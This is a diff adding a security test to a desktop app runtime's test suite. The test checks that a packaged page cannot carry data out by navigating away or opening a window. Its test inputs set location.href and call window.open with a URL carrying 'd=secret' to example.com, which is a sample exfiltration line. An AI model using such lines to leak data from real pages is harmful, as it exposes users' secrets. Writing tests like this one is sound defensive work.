@@ -286,6 +286,19 @@ test('one app, one process: a second start hands the window over', () => {
   }
 }, GUI);
 
+test('a page cannot navigate away to carry data out', () => {
+  // The content-security-policy covers requests, not navigation: without a navigation guard,
+  // location.href = "https://..." would send whatever the page put in the URL.
+  const r = sh(['--app', 'thinapp', '--eval',
+    'new Promise(r => { location.href = "https://example.com/?d=secret"; setTimeout(() => r(location.protocol), 1500); })'],
+    { timeout: 60000, env: { ...process.env, DESKHATCH_HOME: home, HOME: home, DESKHATCH_TEST: '1' } });
+  const out = (r.stdout || '').trim();
+  if (out !== '"hatch:"' && out !== '"http:"') throw new Error(`the page left its package: ${out || r.stderr}`);
+  const w = sh(['--app', 'thinapp', '--eval', 'String(window.open("https://example.com/?d=secret"))'],
+    { timeout: 60000, env: { ...process.env, DESKHATCH_HOME: home, HOME: home, DESKHATCH_TEST: '1' } });
+  if ((w.stdout || '').trim() !== '"null"') throw new Error(`window.open was not denied: ${w.stdout || w.stderr}`);
+}, GUI);
+
 function evalInGallery(expr) {
   const r = spawnSync(run(), ['--eval', expr], {
     encoding: 'utf8',
